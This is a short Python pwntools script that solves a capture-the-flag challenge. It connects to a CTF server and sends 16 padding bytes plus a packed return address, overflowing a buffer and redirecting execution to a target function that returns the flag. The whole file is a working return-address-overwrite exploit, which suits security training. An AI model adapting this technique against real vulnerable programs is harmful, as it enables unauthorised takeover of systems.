#Made by Kasper Melheim

#imports
from pwn import *

#host and port number
conn = remote('ctf21.softwaresecurity.no', 7001)

#receive data from program
conn.recvline()

#overflow the 16 bits
bufferoverflow = b'X'*16
#target address
target = p64(0x4011f6)
print(target)

#data we will send to the program
data = bufferoverflow + target 

#send data and flag will be returned
conn.sendline(data)
conn.interactive()